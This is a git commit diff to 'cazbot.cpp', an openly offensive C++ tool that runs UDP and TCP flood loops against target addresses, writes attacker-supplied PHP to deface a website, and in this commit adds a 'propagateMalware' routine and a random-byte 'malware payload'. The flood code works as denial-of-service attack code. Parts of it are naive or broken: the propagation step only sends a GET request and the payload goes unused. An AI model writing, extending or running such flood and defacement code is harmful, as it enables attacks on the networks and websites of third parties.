259fff2854c659459a285b2e2071918cd78a041d
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-18 19:23:22 +0800

    Update cazbot.cpp

--- cazbot.cpp
+++ cazbot.cpp
@@ -10,7 +10,7 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <netinet/tcp.h>
-#include <sys/socket.h> // Add this line
+#include <sys/socket.h>
 
 #define PACKET_SIZE 4096
 #define MAX_BOTNETS 100000000
@@ -22,6 +22,7 @@ int targetPort;
 string targetWebsite;
 string defaceHTML;
 string malwarePHP;
+string malwarePayload;
 
 void udpFlood(string ip, int port) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
@@ -47,10 +48,24 @@ void tcpFlood(string ip, int port) {
 
     while (true) {
         if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
-            shutdown(sockfd, SHUT_RDWR); // Update this line
+            shutdown(sockfd, SHUT_RDWR);
             sockfd = socket(AF_INET, SOCK_STREAM, 0);
         }
     }
+}
+
+void propagateMalware(string ip) {
+    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockaddr_in destAddr{};
+    destAddr.sin_family = AF_INET;
+    destAddr.sin_port = htons(80);
+    inet_pton(AF_INET, ip.c_str(), &(destAddr.sin_addr));
+
+    if (connect(sockfd, (struct sockaddr*)&destAddr, sizeof(destAddr)) == 0) {
+        string request = "GET /" + targetWebsite + ".php HTTP/1.1\r\nHost: " + ip + "\r\nConnection: close\r\n\r\n";
+        send(sockfd, request.c_str(), request.length(), 0);
+    }
+    close(sockfd);
 }
 
 void generateIPs() {
@@ -70,6 +85,7 @@ void startAttack() {
     for (const auto& ip : botnetIPs) {
         thread(udpFlood, ip, targetPort).detach();
         thread(tcpFlood, ip, targetPort).detach();
+        thread(propagateMalware, ip).detach();
     }
 }
 
@@ -81,6 +97,18 @@ void defaceWebsite() {
     ofstream malwareFile(targetWebsite + ".php");
     malwareFile << malwarePHP;
     malwareFile.close();
+}
+
+string generateMalwarePayload() {
+    srand(time(nullptr));
+    string payload;
+
+    for (int i = 0; i < PACKET_SIZE; i++) {
+        char randomChar = rand() % 256;
+        payload += randomChar;
+    }
+
+    return payload;
 }
 
 int main() {
@@ -97,11 +125,13 @@ int main() {
     cout << "Enter the path to the PHP file for the malware: ";
     getline(cin, malwarePHP);
 
+    malwarePayload = generateMalwarePayload();
+
     generateIPs();
 
     cout << "Botnet IPs generated: " << botnetIPs.size() << endl;
 
-    cout << "Starting the DDoS attack..." << endl;
+    cout << "Starting the DDoS attack and malware propagation..." << endl;
     startAttack();
 
     cout << "Attack started! To stop the attack, press Ctrl + C." << endl;
